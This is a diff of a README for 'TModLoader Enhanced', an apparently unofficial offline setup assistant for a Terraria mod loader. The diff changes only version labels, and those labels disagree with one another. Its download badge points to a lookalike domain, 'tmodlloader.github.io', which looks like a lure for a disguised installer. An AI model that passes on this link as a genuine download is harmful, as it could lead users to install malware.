@@ -1,7 +1,7 @@
 # TModLoader Enhanced — Offline Setup Assistant
 
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://tmodlloader.github.io/.github/)
-[![Version](https://img.shields.io/badge/Version-0.11.8.4-green)](https://github.com/tmodloader/tmodloader)
+[![Version](https://img.shields.io/badge/Version-1.4.4-green)](https://github.com/tmodloader/tmodloader)
 [![Platform](https://img.shields.io/badge/Platform-Windows-blue)](#)
 [![License](https://img.shields.io/badge/License-Terraria-yellow)](#)
 
@@ -136,14 +136,14 @@ Diagnostic Tools: Automated system health checks
 Configuration Backup: Automatic profile backup and restore
 
 📋 Changelog
-Version 2.1.4 (Latest)
+Version 1.4.4-stable (Latest)
 
 Enhanced mod compatibility checker
 Improved server setup wizard
 Added Linux Flatpak support
 Performance optimizations for large mod collections
 
-Version 2.1.3
+Version 1.4.3-legacy
 
 New offline mod repository system
 Advanced graphics settings panel
